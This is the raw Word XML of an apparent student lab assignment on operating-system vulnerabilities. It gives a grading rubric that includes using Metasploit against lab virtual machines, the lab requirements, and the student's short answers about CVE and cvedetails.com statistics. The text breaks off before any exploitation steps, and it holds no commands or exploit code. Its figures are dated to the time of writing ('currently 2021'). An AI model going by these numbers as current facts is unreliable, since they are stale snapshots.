    <w:p w14:paraId="12297D94" w14:textId="77777777" w:rsidR="00B6669B" w:rsidRDefault="00B6669B" w:rsidP="00B6669B">
      <w:r w:rsidRPr="003C3AB0">
        <w:t>I certify that the work submitted in this assignment is my own and that it has not been taken in whole or in part from any other source. I understand that the penalty for plagiarism will include a grade of zero (0) for this assignment plus disciplinary action in accordance with SAIT policies.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23C2BC99" w14:textId="77777777" w:rsidR="00B6669B" w:rsidRDefault="00B6669B" w:rsidP="00B6669B">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3AAAA918" w14:textId="77777777" w:rsidR="00B6669B" w:rsidRPr="009F6C19" w:rsidRDefault="00B6669B" w:rsidP="00B6669B"/>
    <w:p w14:paraId="02BC7725" w14:textId="77777777" w:rsidR="00B6669B" w:rsidRDefault="00B6669B" w:rsidP="00B6669B">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="00C9FDC5" w14:textId="77777777" w:rsidR="00B6669B" w:rsidRDefault="00B6669B" w:rsidP="00B6669B">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3C35D6F5" w14:textId="77777777" w:rsidR="00B6669B" w:rsidRPr="00156C51" w:rsidRDefault="00B6669B" w:rsidP="00B6669B">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00156C51">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>EVALUATION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68"/>
        <w:gridCol w:w="810"/>
        <w:gridCol w:w="810"/>
      </w:tblGrid>
      <w:tr w:rsidR="00C44730" w:rsidRPr="002B2CF9" w14:paraId="3267CEB4" w14:textId="77777777" w:rsidTr="00123EC6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="7668" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="auto"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p w14:paraId="7884464C" w14:textId="30201F00" w:rsidR="00C44730" w:rsidRPr="002B2CF9" w:rsidRDefault="00C44730" w:rsidP="00C44730">
            <w:r>
              <w:t xml:space="preserve">Explore </w:t>
            </w:r>
            <w:r w:rsidR="00F30C65">
              <w:t xml:space="preserve">existing </w:t>
            </w:r>
            <w:r>
              <w:t>databases to identify operat</w:t>
            </w:r>
            <w:r w:rsidR="00787FEF">
              <w:t xml:space="preserve">ing systems vulnerabilities, </w:t>
            </w:r>
            <w:r>
              <w:t>exploits</w:t>
            </w:r>
            <w:r w:rsidR="00787FEF">
              <w:t xml:space="preserve"> and attacks</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="810" w:type="dxa"/>
            <w:tcBorders>
              <w:left w:val="nil"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p w14:paraId="0589D4E3" w14:textId="3C820770" w:rsidR="00C44730" w:rsidRPr="002B2CF9" w:rsidRDefault="00787FEF" w:rsidP="00C44730">
            <w:r>
              <w:t xml:space="preserve">   30</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="810" w:type="dxa"/>
            <w:tcBorders>
              <w:left w:val="nil"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p w14:paraId="13B8C4EF" w14:textId="77777777" w:rsidR="00C44730" w:rsidRPr="002B2CF9" w:rsidRDefault="00C44730" w:rsidP="00C44730"/>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00C44730" w:rsidRPr="002B2CF9" w14:paraId="28244BE5" w14:textId="77777777" w:rsidTr="00123EC6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="7668" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="auto"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p w14:paraId="5371ACFA" w14:textId="423F91F8" w:rsidR="00C44730" w:rsidRDefault="00814D14" w:rsidP="00C44730">
            <w:r>
              <w:t>Scan vulnerable systems</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="810" w:type="dxa"/>
            <w:tcBorders>
              <w:left w:val="nil"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p w14:paraId="4B05C7A4" w14:textId="4FA29B42" w:rsidR="00C44730" w:rsidRDefault="00C42149" w:rsidP="00C44730">
            <w:r>
              <w:t xml:space="preserve">   2</w:t>
            </w:r>
            <w:r w:rsidR="00C44730">
              <w:t>0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="810" w:type="dxa"/>
            <w:tcBorders>
              <w:left w:val="nil"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p w14:paraId="37C8A9BB" w14:textId="77777777" w:rsidR="00C44730" w:rsidRPr="002B2CF9" w:rsidRDefault="00C44730" w:rsidP="00C44730"/>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00C44730" w:rsidRPr="002B2CF9" w14:paraId="7F0C0A66" w14:textId="77777777" w:rsidTr="00123EC6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="7668" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="auto"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p w14:paraId="13804552" w14:textId="204F020E" w:rsidR="00C44730" w:rsidRPr="002B2CF9" w:rsidRDefault="00B70B17" w:rsidP="00C44730">
            <w:r>
              <w:t>Use Metasploit to exploit vulnerable systems</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="810" w:type="dxa"/>
            <w:tcBorders>
              <w:left w:val="nil"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p w14:paraId="3AF005F3" w14:textId="19128792" w:rsidR="00C44730" w:rsidRPr="002B2CF9" w:rsidRDefault="00C44730" w:rsidP="0001541A">
            <w:r>
              <w:t xml:space="preserve">  </w:t>
            </w:r>
            <w:r w:rsidR="00C330C8">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidR="009B6425">
              <w:t>45</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="810" w:type="dxa"/>
            <w:tcBorders>
              <w:left w:val="nil"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p w14:paraId="252106BB" w14:textId="77777777" w:rsidR="00C44730" w:rsidRPr="002B2CF9" w:rsidRDefault="00C44730" w:rsidP="00C44730"/>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00C44730" w:rsidRPr="002B2CF9" w14:paraId="2276C5A2" w14:textId="77777777" w:rsidTr="00123EC6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="7668" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="auto"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p w14:paraId="0BF7DC6D" w14:textId="77777777" w:rsidR="00C44730" w:rsidRPr="002B2CF9" w:rsidRDefault="00C44730" w:rsidP="00C44730">
            <w:r>
              <w:t>TOTAL</w:t>
            </w:r>
            <w:r w:rsidRPr="002B2CF9">
              <w:t xml:space="preserve">  MARK</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="810" w:type="dxa"/>
            <w:tcBorders>
              <w:left w:val="nil"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p w14:paraId="3ECFEE55" w14:textId="33040CE8" w:rsidR="00C44730" w:rsidRPr="002B2CF9" w:rsidRDefault="009B6425" w:rsidP="00C44730">
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:t>95</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="810" w:type="dxa"/>
            <w:tcBorders>
              <w:left w:val="nil"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p w14:paraId="49F6F737" w14:textId="77777777" w:rsidR="00C44730" w:rsidRPr="002B2CF9" w:rsidRDefault="00C44730" w:rsidP="00C44730"/>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="272C3736" w14:textId="4D410E8D" w:rsidR="00E45F6E" w:rsidRDefault="00B6669B" w:rsidP="00F5614E">
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="72DE1E43" w14:textId="0A5CE755" w:rsidR="007B6BA5" w:rsidRPr="000537E5" w:rsidRDefault="00FB3AC4" w:rsidP="007B6BA5">
      <w:pPr>
        <w:pStyle w:val="HeadingStyle1"/>
      </w:pPr>
      <w:bookmarkStart w:id="0" w:name="_Toc452022643"/>
      <w:bookmarkStart w:id="1" w:name="_Toc477810818"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Lab </w:t>
      </w:r>
      <w:r w:rsidR="007B6BA5" w:rsidRPr="000537E5">
        <w:t>Outcome</w:t>
      </w:r>
      <w:bookmarkEnd w:id="0"/>
      <w:r>
        <w:t>(s)</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1"/>
    </w:p>
    <w:p w14:paraId="277B6636" w14:textId="4040B761" w:rsidR="007B6BA5" w:rsidRDefault="0072470D" w:rsidP="007B6BA5">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Identify Vulnerabilities</w:t>
      </w:r>
      <w:r w:rsidR="00F5614E">
        <w:t xml:space="preserve"> and use exploits</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30F93EAE" w14:textId="77777777" w:rsidR="001D399F" w:rsidRDefault="001D399F" w:rsidP="007F2B57"/>
    <w:p w14:paraId="5089985F" w14:textId="77777777" w:rsidR="00FB3AC4" w:rsidRDefault="00FB3AC4" w:rsidP="00FB3AC4">
      <w:pPr>
        <w:pStyle w:val="HeadingStyle1"/>
      </w:pPr>
      <w:bookmarkStart w:id="2" w:name="_Toc477810819"/>
      <w:r>
        <w:t>Reading</w:t>
      </w:r>
      <w:bookmarkEnd w:id="2"/>
    </w:p>
    <w:p w14:paraId="3C94ECAD" w14:textId="0EE30D3D" w:rsidR="00FB4B81" w:rsidRDefault="0072470D" w:rsidP="00FB4B81">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Slides and URL provided in class</w:t>
      </w:r>
      <w:r w:rsidR="00FB4B81">
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="000579E5">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="766E5BB0" w14:textId="77777777" w:rsidR="00264C10" w:rsidRDefault="00264C10" w:rsidP="007F2B57"/>
    <w:p w14:paraId="78FDBDCF" w14:textId="77777777" w:rsidR="00FB3AC4" w:rsidRDefault="00FB3AC4" w:rsidP="00FB3AC4">
      <w:pPr>
        <w:pStyle w:val="HeadingStyle1"/>
      </w:pPr>
      <w:bookmarkStart w:id="3" w:name="_Toc452022645"/>
      <w:bookmarkStart w:id="4" w:name="_Toc477810820"/>
      <w:r w:rsidRPr="001D399F">
        <w:t>Introduction</w:t>
      </w:r>
      <w:bookmarkEnd w:id="3"/>
      <w:bookmarkEnd w:id="4"/>
    </w:p>
    <w:p w14:paraId="30636A67" w14:textId="77777777" w:rsidR="002273D5" w:rsidRDefault="002273D5" w:rsidP="007F2B57"/>
    <w:p w14:paraId="1BCE0A68" w14:textId="2AB06519" w:rsidR="00815306" w:rsidRDefault="0012494A" w:rsidP="007F2B57">
      <w:r>
        <w:t xml:space="preserve">In this </w:t>
      </w:r>
      <w:r w:rsidR="002273D5">
        <w:t xml:space="preserve">lab </w:t>
      </w:r>
      <w:r>
        <w:t>we will explore vulnerabilities</w:t>
      </w:r>
      <w:r w:rsidR="002273D5">
        <w:t xml:space="preserve"> and exploit concepts by accessing databases such as: </w:t>
      </w:r>
      <w:hyperlink r:id="rId9" w:history="1">
        <w:r w:rsidR="00FA1590" w:rsidRPr="00C10352">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://cve.mitre.org/</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="00FA1590">
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:hyperlink r:id="rId10" w:history="1">
        <w:r w:rsidR="00FA1590" w:rsidRPr="00F643EF">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://www.cvedetails.com/</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="00FA1590">
        <w:rPr>
          <w:rStyle w:val="Hyperlink"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="002273D5">
        <w:t>to identify publicly know</w:t>
      </w:r>
      <w:r w:rsidR="00FA1590">
        <w:t>n vulnerabilities and exploits. Mestaploit pen-</w:t>
      </w:r>
      <w:r w:rsidR="00815306">
        <w:t>testing tool will be used to explore vulnerabilities and exploits.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="549E29FA" w14:textId="77777777" w:rsidR="00815306" w:rsidRDefault="00815306" w:rsidP="007F2B57"/>
    <w:p w14:paraId="44A9D062" w14:textId="4F017F27" w:rsidR="00815306" w:rsidRDefault="003004C3" w:rsidP="00815306">
      <w:pPr>
        <w:pStyle w:val="HeadingStyle1"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Lab </w:t>
      </w:r>
      <w:r w:rsidR="00815306">
        <w:t>Requirements:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52BD4744" w14:textId="77777777" w:rsidR="00815306" w:rsidRDefault="00815306" w:rsidP="007F2B57"/>
    <w:p w14:paraId="4263E7AD" w14:textId="6333D571" w:rsidR="00815306" w:rsidRDefault="003004C3" w:rsidP="007F2B57">
      <w:r>
        <w:t>To complete this Lab</w:t>
      </w:r>
      <w:r w:rsidR="00815306">
        <w:t xml:space="preserve"> you need the following:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56D6B77E" w14:textId="77777777" w:rsidR="00815306" w:rsidRDefault="00815306" w:rsidP="00815306">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="38"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Virtual-Box latest version</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A60AA6B" w14:textId="2E3C98A4" w:rsidR="00815306" w:rsidRDefault="007F599F" w:rsidP="00815306">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="38"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Linux –Kali operating system</w:t>
      </w:r>
      <w:r w:rsidR="00C34203">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00815306">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="307612AC" w14:textId="648A5F24" w:rsidR="00815306" w:rsidRDefault="00AD77C6" w:rsidP="00815306">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="38"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Windows 7- </w:t>
      </w:r>
      <w:r w:rsidR="00815306">
        <w:t xml:space="preserve">64 bits </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57785F80" w14:textId="77777777" w:rsidR="00815306" w:rsidRDefault="00815306" w:rsidP="00815306">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="38"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Windows 10. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="569041A4" w14:textId="77777777" w:rsidR="003004C3" w:rsidRDefault="003004C3" w:rsidP="00815306"/>
    <w:p w14:paraId="2E630C9C" w14:textId="2094F71C" w:rsidR="00815306" w:rsidRDefault="00815306" w:rsidP="00815306">
      <w:r>
        <w:t xml:space="preserve">You can download these Virtual-Box Images from OneDrive </w:t>
      </w:r>
      <w:r w:rsidR="003004C3">
        <w:t xml:space="preserve">or you can download the respective .iso(s) and build the images. The images provided are Virtual-Box (.vdi) images if you prefer VMWare(.vmx) images </w:t>
      </w:r>
      <w:r w:rsidR="003004C3" w:rsidRPr="003004C3">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>you have to build your own images</w:t>
      </w:r>
      <w:r w:rsidR="003004C3">
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54109918" w14:textId="77777777" w:rsidR="00815306" w:rsidRDefault="00815306" w:rsidP="007F2B57"/>
    <w:p w14:paraId="03A7855D" w14:textId="77777777" w:rsidR="00B43A39" w:rsidRDefault="00B43A39" w:rsidP="007F2B57"/>
    <w:p w14:paraId="1AAF76D9" w14:textId="77777777" w:rsidR="00A87DB0" w:rsidRDefault="00A87DB0" w:rsidP="007F2B57"/>
    <w:p w14:paraId="00F102B4" w14:textId="77777777" w:rsidR="00546AFF" w:rsidRDefault="00546AFF" w:rsidP="007F2B57"/>
    <w:p w14:paraId="7DD6ED1F" w14:textId="77777777" w:rsidR="00A87DB0" w:rsidRDefault="00A87DB0" w:rsidP="007F2B57"/>
    <w:p w14:paraId="0E481193" w14:textId="77777777" w:rsidR="00A87DB0" w:rsidRDefault="00A87DB0" w:rsidP="007F2B57"/>
    <w:p w14:paraId="677BD5EC" w14:textId="764D4B20" w:rsidR="0050120A" w:rsidRPr="00A87DB0" w:rsidRDefault="005166E7" w:rsidP="007F2B57">
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r w:rsidR="0050120A">
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="73C5D3FF" w14:textId="5E0FC978" w:rsidR="0095424B" w:rsidRDefault="002A7D62" w:rsidP="00A7517C">
      <w:pPr>
        <w:pStyle w:val="HeadingStyle1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Explore Databases to identify Vulnerabilities</w:t>
      </w:r>
      <w:r w:rsidR="004A75AE">
        <w:t xml:space="preserve">          ___/30</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45074630" w14:textId="77777777" w:rsidR="00706BE5" w:rsidRDefault="00706BE5" w:rsidP="00706BE5">
      <w:pPr>
        <w:ind w:left="720"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="037F7174" w14:textId="75C29627" w:rsidR="00706BE5" w:rsidRDefault="00706BE5" w:rsidP="00706BE5">
      <w:pPr>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>The objective of this exercise is to access current databases and differentiate vulnerabilities and operating systems exploitations</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A71B059" w14:textId="77777777" w:rsidR="00706BE5" w:rsidRPr="00706BE5" w:rsidRDefault="00706BE5" w:rsidP="00706BE5"/>
    <w:p w14:paraId="29EB100D" w14:textId="56A64A4C" w:rsidR="00614C53" w:rsidRDefault="00A428FF" w:rsidP="00706BE5">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="29"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00BB3EA3">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>( 2 marks)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00614C53">
        <w:t xml:space="preserve">Access </w:t>
      </w:r>
      <w:hyperlink r:id="rId11" w:history="1">
        <w:r w:rsidR="00614C53" w:rsidRPr="00F643EF">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://cve.mitre.org/about/index.html</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="00706BE5">
        <w:rPr>
          <w:rStyle w:val="Hyperlink"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00706BE5" w:rsidRPr="00706BE5">
        <w:t>and e</w:t>
      </w:r>
      <w:r w:rsidR="00614C53">
        <w:t>xplain w</w:t>
      </w:r>
      <w:r w:rsidR="00367D20">
        <w:t>hat is CVE and why CVE?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="447D32A1" w14:textId="77777777" w:rsidR="00BA7D85" w:rsidRDefault="00BA7D85" w:rsidP="00BA7D85">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="1080"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="73D2DDE1" w14:textId="168E34E0" w:rsidR="00096DE7" w:rsidRDefault="00BA7D85" w:rsidP="00096DE7">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="1440"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>CVE is a publicly available catalogue of cybersecurity vulnerabilities. Cyber security professionals use CVE to make sure they are up to date and talking about the same exploits and vulnerabilities.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="688F25B4" w14:textId="77777777" w:rsidR="00BA7D85" w:rsidRPr="00BA7D85" w:rsidRDefault="00BA7D85" w:rsidP="00096DE7">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="1440"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4056E051" w14:textId="16D7C3AA" w:rsidR="006942C2" w:rsidRDefault="00A428FF" w:rsidP="006942C2">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="29"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00BB3EA3">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r w:rsidR="00BC7CED">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> 5</w:t>
      </w:r>
      <w:r w:rsidRPr="00BB3EA3">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> marks)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="006979DE">
        <w:t>Explore CVE details database</w:t>
      </w:r>
      <w:r w:rsidR="006942C2">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:hyperlink r:id="rId12" w:history="1">
        <w:r w:rsidR="006942C2" w:rsidRPr="00C10352">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://www.cvedetails.com/</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="006942C2">
        <w:t xml:space="preserve"> .</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B15B047" w14:textId="66130BAB" w:rsidR="00367D20" w:rsidRDefault="006979DE" w:rsidP="006942C2">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="1080"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">You can browse the database vulnerabilities by vendor, products, date or type. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F989F2F" w14:textId="602D8017" w:rsidR="006979DE" w:rsidRDefault="006979DE" w:rsidP="006979DE">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="29"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Browse </w:t>
      </w:r>
      <w:r w:rsidR="00017D5F">
        <w:t xml:space="preserve">the database </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">by </w:t>
      </w:r>
      <w:r w:rsidR="00017D5F" w:rsidRPr="00017D5F">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>vulnerability type</w:t>
      </w:r>
      <w:r w:rsidR="00017D5F">
        <w:t xml:space="preserve"> and identify the highest and lowest </w:t>
      </w:r>
      <w:r w:rsidR="00F46ECE">
        <w:t xml:space="preserve">publicly known </w:t>
      </w:r>
      <w:r w:rsidR="00017D5F">
        <w:t xml:space="preserve">vulnerability type </w:t>
      </w:r>
      <w:r w:rsidR="00F46ECE">
        <w:t xml:space="preserve">in the current year? </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C97EEE3" w14:textId="50143A73" w:rsidR="00457C0D" w:rsidRPr="00457C0D" w:rsidRDefault="00201DFA" w:rsidP="00457C0D">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>As of writing this question, DoS is the highest with 94, and Http Response Splitting with 0.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52BCC0DC" w14:textId="761A3388" w:rsidR="00F46ECE" w:rsidRDefault="00017D5F" w:rsidP="006979DE">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="29"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>What year has most identified vulnerabilities?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6637E3BC" w14:textId="2C0ED8EA" w:rsidR="00B840DC" w:rsidRPr="00B840DC" w:rsidRDefault="00B840DC" w:rsidP="00B840DC">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Currently 2021</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="132473E1" w14:textId="5820AEA8" w:rsidR="00017D5F" w:rsidRDefault="00F46ECE" w:rsidP="006979DE">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="29"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>What year has the maximum number of exploits?</w:t>
      </w:r>
      <w:r w:rsidR="00017D5F">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78D93945" w14:textId="47BAB138" w:rsidR="00457C0D" w:rsidRPr="00457C0D" w:rsidRDefault="00457C0D" w:rsidP="00457C0D">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00457C0D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>2010</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0625A77C" w14:textId="1F00F7C1" w:rsidR="00F46ECE" w:rsidRDefault="0023296D" w:rsidP="006979DE">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="29"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Select Microsoft under the </w:t>
      </w:r>
      <w:r w:rsidRPr="00812B1A">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>top 50 vendors</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and analyze </w:t>
      </w:r>
      <w:r w:rsidRPr="0023296D">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Microsoft</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> vulnerabilities statistics and trend</w:t>
      </w:r>
      <w:r w:rsidR="00812B1A">
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t>. What is the most common vulnerability type for Microsoft?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="032D7A83" w14:textId="0913E7D0" w:rsidR="003457E1" w:rsidRPr="003457E1" w:rsidRDefault="003457E1" w:rsidP="003457E1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Code Execution</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E640FB0" w14:textId="3157B368" w:rsidR="00D11C1A" w:rsidRDefault="00D11C1A" w:rsidP="00D11C1A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="29"/>
        </w:numPr>
      </w:pPr>
